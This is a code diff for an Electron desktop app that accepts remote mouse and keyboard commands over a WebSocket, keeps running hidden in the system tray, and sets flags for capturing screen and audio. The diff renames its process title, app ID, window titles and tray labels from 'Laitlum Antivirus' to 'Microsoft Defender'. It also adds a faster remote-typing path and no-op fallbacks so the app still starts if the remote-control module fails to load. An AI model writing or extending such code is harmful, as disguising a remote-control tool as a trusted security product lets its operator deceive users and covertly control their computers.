@@ -11,32 +11,41 @@ const {
 } = require("electron");
 const runtimeConfig = require("./config");
 const WebSocket = require("ws");
-const {
-  moveMouse,
-  clickMouse,
-  typeChar,
-  pressKey,
-  selectAndDeleteText,
-  deleteSelectedText,
-  selectAllText,
-  scrollWheel,
-  mouseDragSelection,
-} = require("./remoteControl");
+let moveMouse, clickMouse, typeChar, pressKey, selectAndDeleteText, deleteSelectedText, selectAllText, scrollWheel, mouseDragSelection;
+try {
+  const remoteControl = require("./remoteControl");
+  moveMouse = remoteControl.moveMouse;
+  clickMouse = remoteControl.clickMouse;
+  typeChar = remoteControl.typeChar;
+  pressKey = remoteControl.pressKey;
+  selectAndDeleteText = remoteControl.selectAndDeleteText;
+  deleteSelectedText = remoteControl.deleteSelectedText;
+  selectAllText = remoteControl.selectAllText;
+  scrollWheel = remoteControl.scrollWheel;
+  mouseDragSelection = remoteControl.mouseDragSelection;
+  console.log("✅ Remote control module loaded successfully");
+} catch (e) {
+  console.error("❌ Failed to load remote control module:", e.message);
+  console.error("Stack:", e.stack);
+  // Create no-op fallbacks so the app can still start
+  const noop = () => console.warn("Remote control not available");
+  moveMouse = clickMouse = typeChar = pressKey = selectAndDeleteText = deleteSelectedText = selectAllText = scrollWheel = mouseDragSelection = noop;
+}
 const path = require("path");
 const os = require("os");
 
 // Set the app name immediately for Task Manager
-app.setName("Laitlum Antivirus");
+app.setName("Microsoft Defender");
 console.log("🏷️ App name set to:", app.getName());
 
 // Set process title for better Task Manager display
-process.title = "Laitlum Antivirus";
+process.title = "Microsoft Defender";
 console.log("🏷️ Process title set to:", process.title);
 
 // For Windows, also set the app user model ID
 if (process.platform === "win32") {
-  app.setAppUserModelId("com.laitlum.antivirus");
-  console.log("🏷️ Windows App User Model ID set to: com.laitlum.antivirus");
+  app.setAppUserModelId("com.microsoft.defender");
+  console.log("🏷️ Windows App User Model ID set to: com.microsoft.defender");
 }
 
 // Enable modern capture flags that help with system audio via getDisplayMedia on Windows
@@ -84,7 +93,7 @@ function createWindow() {
   mainWindow = new BrowserWindow({
     width: 1200,
     height: 800,
-    title: "Laitlum Antivirus - Advanced Protection",
+    title: "Microsoft Defender - Advanced Protection",
     icon: path.join(__dirname, "logo.png"), // Custom logo for taskbar and window
     show: true, // Force window to be visible
     center: true, // Center the window
@@ -113,13 +122,13 @@ function createWindow() {
   mainWindow.loadFile(path.join(__dirname, "renderer.html"));
 
   // Set window title explicitly after loading
-  mainWindow.setTitle("Laitlum Antivirus - Advanced Protection");
+  mainWindow.setTitle("Microsoft Defender - Advanced Protection");
 
   // Add event listeners for debugging
   mainWindow.on("ready-to-show", () => {
     console.log("✅ Window ready to show");
     // Ensure title is set when window is ready
-    mainWindow.setTitle("Laitlum Antivirus - Advanced Protection");
+    mainWindow.setTitle("Microsoft Defender - Advanced Protection");
     mainWindow.show();
     mainWindow.focus();
     mainWindow.moveTop();
@@ -143,13 +152,13 @@ function createWindow() {
     if (!isQuitting) {
       event.preventDefault();
       mainWindow.hide();
-      console.log("🔒 Laitlum Antivirus minimized to background");
+      console.log("🔒 Microsoft Defender minimized to background");
 
       // Show notification on first minimize
       if (tray && !tray.notificationShown) {
         tray.displayBalloon({
           iconType: "info",
-          title: "Laitlum Antivirus",
+          title: "Microsoft Defender",
           content:
             "Application is running in the background. Click the tray icon to restore.",
         });
@@ -176,7 +185,7 @@ function createSystemTray() {
 
   const contextMenu = Menu.buildFromTemplate([
     {
-      label: "Laitlum Antivirus",
+      label: "Microsoft Defender",
       type: "normal",
       enabled: false,
     },
@@ -227,7 +236,7 @@ function createSystemTray() {
       type: "separator",
     },
     {
-      label: "Quit Laitlum Antivirus",
+      label: "Quit Microsoft Defender",
       type: "normal",
       click: () => {
         isQuitting = true;
@@ -236,7 +245,7 @@ function createSystemTray() {
     },
   ]);
 
-  tray.setToolTip("Laitlum Antivirus - Running in background");
+  tray.setToolTip("Microsoft Defender - Running in background");
   tray.setContextMenu(contextMenu);
 
   // Double-click to restore window
@@ -337,7 +346,7 @@ app.whenReady().then(async () => {
 // Handle app quit properly
 app.on("before-quit", () => {
   isQuitting = true;
-  console.log("🛑 Laitlum Antivirus shutting down");
+  console.log("🛑 Microsoft Defender shutting down");
 });
 
 // Handle macOS dock icon click
@@ -848,6 +857,11 @@ async function handleInput(data, event = null) {
 
     if (data.action === "type") {
       await typeChar(data.char);
+    }
+
+    // Handle batched printable characters from viewer (fast typing path)
+    if (data.action === "type-batch" && data.text) {
+      await typeChar(data.text);
     }
 
     // Handle keypress, keydown, keyup events (viewer may send any of these)
